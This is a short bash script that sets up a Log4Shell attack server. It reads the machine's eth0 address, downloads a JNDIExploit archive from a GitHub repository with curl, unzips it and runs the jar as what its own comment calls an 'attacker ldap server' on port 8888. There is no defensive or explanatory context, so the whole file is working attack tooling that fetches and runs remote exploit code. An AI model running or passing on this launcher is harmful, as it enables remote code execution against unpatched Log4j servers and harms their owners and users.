#!/bin/bash

APP_DIR="${HOME}/log4j"
APP_IP="$(ip -4 addr show eth0 | grep "inet\b" | awk '{print $2}' | cut -d/ -f1)"
APP_PORT=8888

# setup app directory
if [ ! -d "${APP_DIR}" ]; then
    mkdir -p "${APP_DIR}"
fi

cd "${APP_DIR}" || return

if [ ! -f "${APP_DIR}/JNDIExploit-1.2-SNAPSHOT.jar" ]; then
    curl -LOJ "https://github.com/black9/Log4shell_JNDIExploit/raw/main/JNDIExploit.v1.2.zip"
    sleep 2
    unzip JNDIExploit.v1.2.zip
fi

# run attacker ldap server
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i "${APP_IP}" -p "${APP_PORT}"